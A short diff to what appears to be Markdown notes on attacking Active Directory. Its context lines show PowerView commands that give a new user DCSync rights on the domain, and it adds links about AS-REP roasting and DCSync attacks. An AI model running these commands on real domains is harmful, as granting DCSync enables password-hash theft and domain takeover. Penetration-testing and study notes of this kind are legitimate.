@@ -59,3 +59,11 @@ Import PowerView
 `$cred = New-Object System.Management.Automation.PSCredential('<Domain Controller>\<New Username>', $pass)`
 
 `Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<dc>,DC=<dc>" -PrincipalIdentity "<New Username>" -Rights DCSync`
+
+# Extra Resources
+
+[What is AS-REP Roasting?](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/)
+
+[Kuberos DCSync Attacks Explained](https://www.qomplx.com/kerberos_dcsync_attacks_explained/)
+
+[PowerView 3.0 Tips & Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
